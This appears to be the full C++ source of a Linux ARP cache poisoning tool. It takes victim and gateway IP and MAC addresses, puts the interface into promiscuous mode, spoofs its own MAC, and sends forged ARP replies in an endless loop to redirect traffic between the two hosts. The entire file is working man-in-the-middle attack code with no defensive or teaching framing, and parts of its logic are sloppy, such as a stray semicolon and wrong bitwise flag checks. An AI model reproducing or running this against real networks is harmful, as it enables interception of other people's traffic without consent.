/* 
 *
*/

// Headers
#include <cstdlib>
#include <cstdio>
#include <iostream>
#include <cstring>
#include <csignal>
#include <cerrno>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <netinet/ether.h>
#include <linux/wireless.h>
#include <linux/if_packet.h>
#include <linux/filter.h>
#include <linux/if.h>
#include <net/if_arp.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <poll.h>
#include <cassert>

// Defines
#define IP_ALEN 4
#define IP_PRES 15 // 12 numbers + 3 decimals
//#define PROMISCFILTER
#define RING_FRAMES 128                                     // number of frames in ring
#define PKT_OFFSET  (TPACKET_ALIGN(sizeof(tpacket_hdr)) + \
                     TPACKET_ALIGN(sizeof(sockaddr_ll)))    // packet offset

// Incase glibc 2.1
#ifndef SOL_PACKET
#define SOL_PACKET 263
#endif

// QDisk Bypass, >= 3.14
#ifndef PACKET_QDISC_BYPASS
#define PACKET_QDISC_BYPASS 20
#endif

// ANSI Excape Macros
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define NF      "\033[0m"
#define CLRLN   "\033[2K"
#define CUP     "\033[1A"
#define CLRSCRN "\033[2J\033[1;1H"

// Global Structs
typedef struct {
    __be16        ar_hrd,
                  ar_pro;
    unsigned char ar_hln,
                  ar_pln;
    __be16        ar_op;

    // Usually #if 0 Out
    unsigned char ar_sha[ETH_ALEN],
                  ar_sip[IP_ALEN],
                  ar_tha[ETH_ALEN],
                  ar_tip[IP_ALEN];
}__attribute__((__packed__)) arp_hdr;

// Berkley Packet Filter Assembley
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
// Filter All Packets
struct sock_filter promiscfilter[] = {
    BPF_STMT(BPF_RET, ETH_FRAME_LEN)                              // return ethernet frame
};

// Filter MAC Broadcast And Unicast Packets
struct sock_filter macfilter[] = {                                
    BPF_STMT(BPF_LD  + BPF_W    + BPF_ABS, 2),                    // A <- P[2:4]
    BPF_JUMP(BPF_JMP + BPF_JEQ  + BPF_K,   0xffffffff, 0, 2),     // if A != broadcast GOTO LABEL
    BPF_STMT(BPF_LD  + BPF_H    + BPF_ABS, 0),                    // A <- P[0:2]
    BPF_JUMP(BPF_JMP + BPF_JEQ  + BPF_K,   0x0000ffff, 2, 0),     // if A == 0xffff     GOTO ACCEPT
    // LABEL
    BPF_STMT(BPF_LD  + BPF_B    + BPF_ABS, 0),                    // A <- P[0:1]
    BPF_JUMP(BPF_JMP + BPF_JSET + BPF_K,   0x01,       0, 1),     // if !(A & 1)        GOTO REJECT
    // ACCEPT
    BPF_STMT(BPF_RET, ETH_FRAME_LEN),                             // accept packet, size of ethernet frame
    // REJECT
    BPF_STMT(BPF_RET, 0),                                         // drop packet, return null
};

// Filter ARP Frames
struct sock_filter arpfilter[] = {
    BPF_STMT(BPF_LD  + BPF_H   + BPF_ABS, 12),                    // skip 12 bytes into frame offset for hwr addr
    BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K,   ETH_P_ARP, 0, 1),       // eth hardware addr != ARP skip next instruc
    BPF_STMT(BPF_RET + BPF_K,    sizeof(ethhdr)+sizeof(arp_hdr)), // size of ARP frame
    BPF_STMT(BPF_RET + BPF_K,    0),                              // return ARP frame or null
};
//<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

// Static Globals
static const std::size_t PSIZE       = sizeof(ethhdr) + sizeof(arp_hdr);
static volatile sig_atomic_t sigCond = 0;                     // signal condition variable
static const long pagesize           = sysconf(_SC_PAGESIZE); // pagesize
static int rxring_offset             = 0;                     // ring offset

// Function Prototypes
static void sighand      (int sig, siginfo_t* si, void* ucontext) {} // signal handler
static int  rfmon_up     (const char* const ifc, int sfd);
static int  rfmon_down   (const char* const ifc, ifreq old_ifr, iwreq old_iwr, int sfd);
static int  promisc_up   (const char* const ifc, int sfd);
static int  promisc_down (const char* const ifc, int sfd);
static int  map_destruct (unsigned char *&ring);
static int  attach_filter(const char* const ifc, const unsigned char* const smac, int sfd);
static int  send_arp     (const char* const ifc,
                          const unsigned char* const sha, const unsigned char* const sip,
                          const unsigned char* const tha, const unsigned char* const tip,
                          const unsigned opcode, const bool verbose);
static void  rx_release  (unsigned char *&ring);
static void* process_rx  (unsigned char *&ring, int sfd);

// Main
int main(int argc, char **argv) {
    // Check Args
    if(argc < 6 || !std::strncmp(argv[1], "-h", std::strlen("-h") + 1)) {
        std::cerr << "\nUsage: " << argv[0] << " [interface] [victim-ip] [gate-ip] [victim-mac] [gate-mac]\n\n";
        return EXIT_FAILURE;
    }

    // Chec CAP_NET_RAW Root
    if(geteuid() || getuid()) {
        printf("\nMust be root!\n\n");
        return EXIT_FAILURE;
    }

    // Declarations
    unsigned char V_ip[IP_ALEN], S_ip[IP_ALEN],  V_mac [ETH_ALEN], S_mac[ETH_ALEN],
                  sip [IP_ALEN], smac[ETH_ALEN], packet[PSIZE], bcast[ETH_ALEN];
    sockaddr_in   sinS, sinV;
    sockaddr_ll   sll;
    ifreq         ifr, old_ifr;
    iwreq         iwr, old_iwr;
    tpacket_req3  treq;
    unsigned char *ring;
    const char* const IFACE        = argv[1];
    const unsigned char macBCast[] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
    const bool     vFlag_1         = false, vFlag_2 = true;
    const unsigned opFlag1         = 1,     opFlag2 = 1;

    // Zero Out
    std::memset(V_ip,  0, IP_ALEN);
    std::memset(S_ip,  0, IP_ALEN);
    std::memset(V_mac, 0, ETH_ALEN);
    std::memset(S_mac, 0, ETH_ALEN);
    std::memset(sip,   0, IP_ALEN);
    std::memset(smac,  0, ETH_ALEN);
    std::memset(bcast, 0, ETH_ALEN);
    std::memset(&sll,  0, sizeof(sll));
    std::memset(&ifr,  0, sizeof(ifr));
    std::memset(&iwr,  0, sizeof(iwr));
    std::memset(&treq, 0, sizeof(treq));

    // Copy In Args
    inet_aton(argv[2], &sinV.sin_addr);
    inet_aton(argv[3], &sinS.sin_addr);
    std::memcpy(V_ip, &sinV.sin_addr, IP_ALEN);
    std::memcpy(S_ip, &sinS.sin_addr, IP_ALEN);
    std::memcpy((void*)V_mac, (const void*)ether_aton(argv[4]), ETH_ALEN);
    std::memcpy((void*)S_mac, (const void*)ether_aton(argv[5]), ETH_ALEN);

    // Create RAW Socket
    int sfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(sfd == -1) {
        std::perror("socket");
        return EXIT_FAILURE;
    }
    
    // Save Current Interface Mode 
    std::strncpy(old_iwr.ifr_name, IFACE, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCGIWMODE, &old_iwr) == -1) {
        std::perror("ioctl - SIOCGIWMODE");
        return EXIT_FAILURE;
    }

    // Get Interface Flags
    std::strncpy(ifr.ifr_name, IFACE, IFNAMSIZ); // copy in interface device   
    if((ioctl(sfd, SIOCGIFFLAGS, &ifr) == -1)) {
	    std::perror("ioctl - SIOCGIFFLAGS1");
	    return EXIT_FAILURE;
	}
    
    // Save Interface Flags
    old_ifr.ifr_flags = ifr.ifr_flags;

    // Check If Interface Is Up
    if(!(ifr.ifr_flags & IFF_UP & IFF_BROADCAST & IFF_RUNNING)) {
        // Or In Up, Broadcast, Running
        ifr.ifr_flags |= IFF_UP | IFF_BROADCAST | IFF_RUNNING;

        // Set Interface Flags   
        if(ioctl(sfd, SIOCSIFFLAGS, &ifr) == -1) {
            std::perror("ioctl - SIOCSIFFLAGS");
            return EXIT_FAILURE;
        }
    }

    // Set Packet Version
    int v = TPACKET_V1;
    if(setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &v, sizeof(v)) == -1) {
        std::perror("setsockopt - PACKET_VERSION");
        return false;
    }

    // Set Up Receiving Ring Sizes
    treq.tp_block_size       = RING_FRAMES * getpagesize();
    treq.tp_block_nr         = 1;   
    treq.tp_frame_size       = getpagesize();
    treq.tp_frame_nr         = RING_FRAMES;
    treq.tp_retire_blk_tov   = 60;
    treq.tp_feature_req_word = TP_FT_REQ_FILL_RXHASH;

    // Sanity Checks
    if((treq.tp_frame_size <= TPACKET_HDRLEN) || (treq.tp_frame_size % TPACKET_ALIGNMENT)
                                              || (treq.tp_block_size % treq.tp_frame_size)) {
        std::cerr << "\nSanity Checks";
        return false;
    }
    
    // Attach Packet Rings
    if(setsockopt(sfd, SOL_PACKET, PACKET_RX_RING, &treq, sizeof(treq)) == -1) {
        std::perror("setsockopt - PACKET_RX_RING");
        return false;
    }
  
    // Set Up Time Outs
    struct timeval receive_timeout;
    receive_timeout.tv_sec  = 1;
    receive_timeout.tv_usec = 0;
    
    if(setsockopt(sfd, SOL_SOCKET, SO_RCVTIMEO, &receive_timeout, sizeof(receive_timeout)) == -1) {
        std::perror("setsockopt - SO_RCVTIMEO");
        return false;
    }
    
    // Memory Map For Semi-Zero Copy
    if((ring = (unsigned char*)mmap(NULL, treq.tp_block_size * treq.tp_block_nr,
                                    PROT_READ | PROT_WRITE, MAP_SHARED, sfd, 0)) == MAP_FAILED) {
        std::perror("mmap");
        return false;
    }

    /*// Set Channel   
    iwr.u.freq.m = (double)11;
    iwr.u.freq.e = (double)0;
    std::strncpy(iwr.ifr_name, IFACE, IFNAMSIZ); // copy in interface device      
    if(ioctl(sfd, SIOCSIWFREQ, &iwr) == -1) {
        std::perror("ioctl - SIOCSIWFREQ");
        return -1;
    }*/
    
    /*/// Set Up Monitor Mode
    if(rfmon_up(IFACE, sfd))
        return EXIT_FAILURE;*/

    // Set Promiscous Mode
    if(promisc_up(IFACE, sfd))
        return EXIT_FAILURE;

    // Get Hardware(MAC) Address
    std::strncpy(ifr.ifr_name, IFACE, IFNAMSIZ); // copy in interface device   
    if(ioctl(sfd, SIOCGIFHWADDR, &ifr) == -1) {
        std::perror("ioctl - SIOCGIFHWADDR");
        return EXIT_FAILURE;
    }

    // Spoof Our Hardware(MAC) Adrress
    ++ifr.ifr_hwaddr.sa_data[0]; ++ifr.ifr_hwaddr.sa_data[1]; 
    ++ifr.ifr_hwaddr.sa_data[2]; ++ifr.ifr_hwaddr.sa_data[3];
    ++ifr.ifr_hwaddr.sa_data[4]; ++ifr.ifr_hwaddr.sa_data[5];
    
    std::memcpy(smac, &ifr.ifr_hwaddr.sa_data, ETH_ALEN); // copy in MAC
    
    // Get Broadcast Address
    std::strncpy(ifr.ifr_name, IFACE, IFNAMSIZ); // copy in interface device   
    if(ioctl(sfd, SIOCGIFBRDADDR, &ifr) == -1) {
        std::perror("ioctl - SIOCGIFBRDADDR");
        return EXIT_FAILURE;
    }

    std::memcpy(bcast, &ifr.ifr_broadaddr.sa_data, ETH_ALEN); // copy in broadcast

    // Get IP Address
    std::strncpy(ifr.ifr_name, IFACE, IFNAMSIZ); // copy in interface device   
    if(ioctl(sfd, SIOCGIFADDR, &ifr) == -1) {
        std::perror("ioctl - SIOCGIFADDR");
        return EXIT_FAILURE;
    }

    // Spoof Our IP Address
    std::memcpy(sip, ifr.ifr_addr.sa_data + 2, IP_ALEN); // copy in

    // Set Up Filter
    if(attach_filter(IFACE, smac, sfd))
        return EXIT_FAILURE;

    // Get Interface Index
    std::strncpy(ifr.ifr_name, IFACE, IFNAMSIZ); // copy in interface device   
    if(ioctl(sfd, SIOCGIFINDEX, &ifr) == -1) {
        std::perror("ioctl - SIOCGIFINDEX");
        return EXIT_FAILURE;
    }

    // Set Up Socket Link-Layer Address
    sll.sll_ifindex  = ifr.ifr_ifindex;
    sll.sll_family   = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_hatype   = htons(ARPHRD_IEEE80211);
    sll.sll_pkttype  = PACKET_OTHERHOST;
    //sll.sll_halen    = ETH_ALEN;
    //std::memcpy(&sll.sll_addr, smac, ETH_ALEN); // copy in

    // Set Up Signal Handler
    struct sigaction sa;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags     = 0;
    sa.sa_sigaction = sighand;

    if(sigaction(SIGINT,  &sa, NULL) == -1) { // SIGINT
        std::perror("sigaction - SIGINT");
        return EXIT_FAILURE;
    }
    if(sigaction(SIGQUIT, &sa, NULL) == -1) { // SIGQUIT
        std::perror("sigaction - SIGQUIT");
        return EXIT_FAILURE;
    }
    if(sigaction(SIGCHLD, &sa, NULL) == -1) { // SIGCHLD
        std::perror("sigaction - SIGCHLD");
        return EXIT_FAILURE;
    }
    if(sigaction(SIGHUP,  &sa, NULL) == -1) { // SIGHUP
            std::perror("sigaction");
            return EXIT_FAILURE;
    }

    // Verbose
    std::printf("\nSpoofed MAC Address: %s%02x:%02x:%02x:%02x:%02x:%02x%s\n\n",
        GREEN, smac[0], smac[1], smac[2], smac[3], smac[4], smac[5], NF);

    // Fork Program Flow
    pid_t cpid = fork();
    switch(cpid) {
        // Error
        case -1:
            std::perror("fork()");
            return EXIT_FAILURE;
        // Child
        case 0:
            // Infinite Loop, ARP Cache Poisoning
            for(;;) {
                send_arp(IFACE, smac, S_ip, V_mac, V_ip, opFlag1, vFlag_1); // S to V
                send_arp(IFACE, smac, V_ip, S_mac, S_ip, opFlag1, vFlag_1); // V to S
                //usleep(400000);                                             // slow down poisoning
            }

            // Shouldn't Get Here
            exit(EXIT_FAILURE);
        // Parent
        default:
            break;
    }
            
    // Infinite Loop Redirection, ARP Spoofing
    for(;;) { // Sniff ARP Frames (blocks)
        // Grab Packet
        tpacket_hdr *packet = (tpacket_hdr*)process_rx(ring, sfd);
            if(!packet) // received signal interuption
                break;

        // Set Headers
        ethhdr  *eth = (ethhdr*) ((uint8_t*)packet + packet->tp_mac);
        arp_hdr *arp = (arp_hdr*)((uint8_t*)eth    + sizeof(ethhdr));

        // Process Packet, Check ARP Frame
        if(eth->h_proto == htons(ETH_P_ARP)                                         && // arp
            ((!std::strncmp(inet_ntoa(*(in_addr*)&arp->ar_tip), argv[2], IP_PRES)   && // S to V
               std::strncmp(inet_ntoa(*(in_addr*)&arp->ar_sip), argv[3], IP_PRES))  ||
             (!std::strncmp(inet_ntoa(*(in_addr*)&arp->ar_tip), argv[3], IP_PRES)   && // V to S
              !std::strncmp(inet_ntoa(*(in_addr*)&arp->ar_sip), argv[2], IP_PRES))) && 
              *arp->ar_sha != *smac)                                                   // not our mac
                    send_arp(IFACE, smac, arp->ar_tip, arp->ar_sha, arp->ar_sip, opFlag2, vFlag_2);

            // Release Packet
            rx_release(ring);
    }

    // Clean Up
    std::cout << "\nCleaning Up...";
    std::fflush(stdout); // flush
    
    // Sure Kill Child
    if(kill(cpid, SIGKILL)) {
        std::cout << " [" << RED << "BAD" << NF << ']';       
        std::perror("kill");
        return EXIT_FAILURE;
    }

    /*/ Unset Monitor Mode
    if(rfmon_down(IFACE, old_ifr, old_iwr, sfd)) {
        std::cout << " [" << RED << "BAD" << NF << ']';       
        return EXIT_FAILURE;
    }*/

    // Unset Promiscous Mode
    if(promisc_down(IFACE, sfd)) {
        std::cout << " [" << RED << "BAD" << NF << ']';       
        return EXIT_FAILURE;
    }

    // Destrust Ring Map
    if(map_destruct(ring)) {
        std::cout << " [" << RED << "BAD" << NF << ']';       
        return EXIT_FAILURE;
    }
    
    // CLose Socket
    if(close(sfd)) {
        std::cout << " [" << RED << "BAD" << NF << ']';       
        std::perror("close");
        return EXIT_FAILURE;
    }

    // Verbose
    sleep(1);                                     // sleep for verbose
    std::cout << " [" << GREEN "OK" << NF << ']';
    std::fflush(stdout);                          // flush
    sleep(1);                                     // sleep for verbose

    // Success
    std::cout << "\n\nGood-Bye!\n\n";
    return EXIT_SUCCESS;
}

// Function Implementations
int rfmon_up(const char* const ifc, int sfd) {
    // Declarations
    ifreq ifr;
    iwreq iwr;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));
    std::memset(&iwr, 0, sizeof(iwr));

    // Set Interface Down, ifr_flags = 0 from memset
    std::strncpy(ifr.ifr_name, ifc, IFNAMSIZ); // copy in interface device     
    if(ioctl(sfd, SIOCSIFFLAGS, &ifr) == -1) { // set flags
        std::perror("rfmon_up: ioctl - SIOCSIFFLAGS-1");
        return -1;
    }

    // Get Mode
    std::strncpy(iwr.ifr_name, ifc, IFNAMSIZ); // copy in interface device  
    if(ioctl(sfd, SIOCGIWMODE, &iwr) == -1) {
        std::perror("rfmon_up: ioctl - SIOCGIWMODE");
        return -1;
    }
 
    // Set Interface Mode
    if(iwr.u.mode != IW_MODE_MONITOR) {        // check if set
        iwr.u.mode = IW_MODE_MONITOR;          // not set, set monitor mode

        // Set Mode
        if(ioctl(sfd, SIOCSIWMODE, &iwr) == -1) {
            std::perror("rfmon_up: ioctl - SIOCSIWMODE");
            return -1;
        }
    }

    // Check If Interface Is Up
    if(!(ifr.ifr_flags & IFF_UP & IFF_BROADCAST & IFF_RUNNING))
        ifr.ifr_flags |= IFF_UP | IFF_BROADCAST | IFF_RUNNING; // OR in up, broadcast, running

    // Set Interface Flags
    if(ioctl(sfd, SIOCSIFFLAGS, &ifr) == -1) {
        std::perror("rfmon_up: ioctl - SIOCSIFFLAGS-2");
        return -1;
    }

// Success
    return 0;
}

int rfmon_down(const char* const ifc, ifreq old_ifr, iwreq old_iwr, int sfd) {
    // Declarations
    ifreq ifr;
    iwreq iwr;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));
    std::memset(&iwr, 0, sizeof(iwr));   
    
    // Set Interface Down, ifr_flags = 0 from memset
    std::strncpy(ifr.ifr_name, ifc, IFNAMSIZ);     // copy in interface device  
    if(ioctl(sfd, SIOCSIFFLAGS, &ifr) == -1) {     // set flags
        std::perror("rfmon_down: ioctl - SIOCSIFFLAGS-1");
        return -1;
    }

    // Set Interface Mode
    std::strncpy(old_iwr.ifr_name, ifc, IFNAMSIZ); // copy in interface device      
    if(old_iwr.u.mode != IW_MODE_INFRA) {          // check if set
        old_iwr.u.mode = IW_MODE_INFRA;            // not set, set managed mode
        
        // Set Mode
        if(ioctl(sfd, SIOCSIWMODE, &old_iwr) == -1) {
            std::perror("rfmon_down: ioctl - SIOCSIWMODE");
            return -1;
        }
    }

    // Check If Interface Is Up
    if(!(old_ifr.ifr_flags & IFF_UP & IFF_BROADCAST & IFF_RUNNING))
        old_ifr.ifr_flags |= IFF_UP | IFF_BROADCAST | IFF_RUNNING; // OR in up, broadcast, running

    // Set Interface Up
    std::strncpy(old_ifr.ifr_name, ifc, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCSIFFLAGS, &old_ifr) == -1) {
        std::perror("rfmon_down: ioctl - SIOCSIFFLAGS-2");
        return false;
    }

    // Success
    return 0;
}

int promisc_up(const char* const ifc, int sfd) {
    // Declarations
    ifreq ifr;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));

    // Get Interface Flags
    std::strncpy(ifr.ifr_name, ifc, IFNAMSIZ); // copy in interface device  
    if((ioctl(sfd, SIOCGIFFLAGS, &ifr) == -1)) {
	    std::perror("promisc_up: ioctl - SIOCGIFFLAGS");
	    return -1;
	}

    // OR In Promiscuous
    if(ifr.ifr_flags & IFF_PROMISC)            // check if set
        return 0;                              // already set
    else
        ifr.ifr_flags |= IFF_PROMISC;          // not set, set promsicuous

    // Set Interface Flags   
    if(ioctl(sfd, SIOCSIFFLAGS, &ifr) == -1) {
        std::perror("promisc_up: ioctl - SIOCSIFFLAGS");
        return -1;
    }

    // Success
    return 0;
}

int promisc_down(const char* const ifc, int sfd) {
    // Declarations
    ifreq ifr;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));
     
    // Get Interface Flags
    std::strncpy(ifr.ifr_name, ifc, IFNAMSIZ); // copy in interface device     
    if((ioctl(sfd, SIOCGIFFLAGS, &ifr) == -1)) {
	    std::perror("promisc_down: ioctl - SIOCGIFFLAGS");
	    return -1;
	}

    // AND Out Promiscuous
    if(ifr.ifr_flags & IFF_PROMISC)            // check if set
        ifr.ifr_flags &= ~IFF_PROMISC;         // unset promiscuous
    else
        return 0;                              // already set

    // Set Interface Flags
	if(ioctl(sfd, SIOCSIFFLAGS, &ifr) == -1) {
        std::perror("promisc_down: ioctl - SIOCSIFFLAGS");
        return -1;
    }

    // Success
    return 0;
}

int map_destruct(unsigned char *&ring) {
    // Unmap Memory
    if(munmap(ring, RING_FRAMES * getpagesize())) {
        std::perror("munmap");
        return -1;
    }

    // Success
    return 0;
}

int attach_filter(const char* const ifc, const unsigned char* const smac, int sfd) {
   // Declarations
    sock_fprog  fprog;
    sock_filter *s_filter = NULL;
    
    // Zero Out
    std::memset(&fprog, 0, sizeof(fprog));

// Promiscous Filtering
#ifdef PROMISCFILTER
    // Allocate Filter
    if(!(s_filter = (sock_filter*)std::malloc(sizeof(promiscfilter)))) {
        std::perror("malloc");
        return -1;
    }

    // Copy In
    std::memcpy(s_filter, &promiscfilter, sizeof(promiscfilter));

    // Initialize
    fprog.filter = s_filter;
    fprog.len    = sizeof(promiscfilter)/sizeof(sock_filter);

// MAC Address Filtering
#else
    // Allocate Filter
    if(!(s_filter = (sock_filter*)std::malloc(sizeof(macfilter)))) {
        std::perror("malloc");
        return -1;
    }
    
    // Copy In
    std::memcpy(s_filter, &macfilter, sizeof(macfilter));

    // Adjust For Fake MAC Address
    s_filter[1].k = (smac[2] & 0xff) << 24 |
                    (smac[3] & 0xff) << 16 |
                    (smac[4] & 0xff) << 8  |
                    (smac[5] & 0xff);
    s_filter[3].k = (smac[0] & 0xff) << 8  |
                    (smac[1] & 0xff);

    // Initialize
    fprog.filter = s_filter;
    fprog.len    = sizeof(macfilter)/sizeof(sock_filter);
#endif

    // Attach Linux Packet Filter
    if(setsockopt(sfd, SOL_SOCKET, SO_ATTACH_FILTER, &fprog, sizeof(fprog)) == -1) {
        std::perror("attach_filter: setsockopt - SO_ATTACH_FILTER");
        return -1;
    }

    // Success
    return 0;
}

int send_arp(const char* const ifc,
             const unsigned char* const sha, const unsigned char* const sip,
             const unsigned char* const tha, const unsigned char* const tip,
             const unsigned opcode, const bool verbose) {
    // Declarations
    unsigned char arpPacket[PSIZE];
    ethhdr      *ethSpoof = (ethhdr*)  arpPacket;
    arp_hdr     *arpSpoof = (arp_hdr*)(arpPacket + sizeof(ethhdr));
    ifreq        ifr;
    sockaddr_ll  destll;

    // Zero Out
    std::memset(&ifr,    0, sizeof(ifr));
    std::memset(&destll, 0, sizeof(destll));   

    // Create RAW Socket
    int sfdC = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if(sfdC == -1) {
        std::perror("socket");
        return -1;
    }

    // Copy In Interface Device
    std::strncpy(ifr.ifr_name, ifc, IFNAMSIZ);

    // Get Interface Flags
    if((ioctl(sfdC, SIOCGIFFLAGS, &ifr) == -1)) {
	    std::perror("createSniffer: ioctl - SIOCGIFFLAGS");
	    return false;
	}

    // Check If Interface Is Up
    if(!(ifr.ifr_flags & IFF_UP & IFF_BROADCAST & IFF_RUNNING)) {
        // Or In Up, Broadcast, Running
        ifr.ifr_flags |= IFF_UP | IFF_BROADCAST | IFF_RUNNING;

        // Set Interface Flags   
        if(ioctl(sfdC, SIOCSIFFLAGS, &ifr) == -1) {
            std::perror("ioctl - SIOCSIFFLAGS");
            return false;
        }
    }

    // Bypass QDisk Layer, >= linux 3.14
    int val = 1;
	if(setsockopt(sfdC, SOL_PACKET, PACKET_QDISC_BYPASS, &val, sizeof(val))) {
        std::perror("setsockopt - PACKET_QDISC_BYPASS");
        return false;
    }

    // Create Ethernet Header
    std::memcpy(ethSpoof->h_source, sha, ETH_ALEN);
    std::memcpy(ethSpoof->h_dest,   tha, ETH_ALEN);   
    ethSpoof->h_proto = htons(ETH_P_ARP);

    // Create ARP Header
    arpSpoof->ar_hrd = htons(ARPHRD_ETHER);
    arpSpoof->ar_pro = htons(ETH_P_IP);
    arpSpoof->ar_hln = ETH_ALEN;
    arpSpoof->ar_pln = IP_ALEN;

    if(opcode == 1)
        arpSpoof->ar_op = htons(ARPOP_REPLY);
    else if(opcode == 2);
        arpSpoof->ar_op = htons(ARPOP_REPLY);
    
    std::memcpy(arpSpoof->ar_sha, sha, ETH_ALEN);
    std::memcpy(arpSpoof->ar_sip, sip, IP_ALEN);
    std::memcpy(arpSpoof->ar_tha, tha, ETH_ALEN);
    std::memcpy(arpSpoof->ar_tip, tip, IP_ALEN);

    // Get Interface Index
    if(ioctl(sfdC, SIOCGIFINDEX, &ifr) == -1) {
        std::perror("ioctl - SIOCGIFINDEX");
        return -1;
    }

    // Set Up Socket Link-Layer Address
    destll.sll_ifindex  = ifr.ifr_ifindex;
    destll.sll_family   = AF_PACKET;
    destll.sll_protocol = htons(ETH_P_IP);
    destll.sll_hatype   = htons(ARPHRD_IEEE80211);
    destll.sll_pkttype  = PACKET_OUTGOING;
    destll.sll_halen    = ETH_ALEN;
    std::memcpy(&destll.sll_addr, tha, ETH_ALEN);
    
    // Send Spoofed Packet Back Out
    if(sendto(sfdC, arpPacket, sizeof(arpPacket), 0, (sockaddr*)&destll, sizeof(sockaddr_ll)) == -1) {
        std::perror("sendtoArp");
        return -1;
    }
 
    // Verbose
    if(verbose)
        std::printf("Sent ARP Reply: %s%s%s Spoofed To %s%02x:%02x:%02x:%02x:%02x:%02x%s\n",
            GREEN, inet_ntoa(*(in_addr*)&arpSpoof->ar_sip), NF,
            GREEN,
            arpSpoof->ar_sha[0], arpSpoof->ar_sha[1], arpSpoof->ar_sha[2],
            arpSpoof->ar_sha[3], arpSpoof->ar_sha[4], arpSpoof->ar_sha[5],
            NF);
        

    // Close RAW Socket
    if(close(sfdC)) {
        std::perror("close");
        return -1;
    }

    // Success
    return 0;
}

void* process_rx(unsigned char *&ring, int sfd) {
    // Set Up Polling
    pollfd pfd;
    pfd.fd      = sfd;
    pfd.events  = POLLIN;
    pfd.revents = 0;

    // Fetch Out Frame
    tpacket_hdr *header = (tpacket_hdr*)(ring + (rxring_offset * getpagesize()));

    // Assert Our Frame For Our Sanity
    assert(!(((unsigned long)header)&(getpagesize()-1)));

    // Check For Consumption :D :D 
    if(!(header->tp_status & TP_STATUS_USER)) { // TP_STATUS_USER means process owns packet, wait till not set
        int ret = poll(&pfd, 1, -1);            // wait(poll)
        if(ret < 0) {
            if(errno != EINTR) {                // harder error
                std::perror("poll");
                return (void*)-1;
            }

            return NULL;                        // let user know signal interuption
        }
    }

    // Data Check Our Frame Status
    if(header->tp_status & TP_STATUS_COPY)
        std::cerr << "\nincomplete packet detected";
    if(header->tp_status & TP_STATUS_LOSING)
        std::cerr << "\ndropped packet detected";

    // Success, Return Packet
    return (void*)header;
}

void rx_release(unsigned char *&ring) {
    // Declarations
    tpacket_hdr *header;

    // Grant Kernel Status
    header = (tpacket_hdr*)(ring + (rxring_offset * getpagesize()));
    header->tp_status = TP_STATUS_KERNEL; // flush status

    // Update Consumer Pointer
    rxring_offset = (rxring_offset + 1) & (RING_FRAMES - 1);   
}

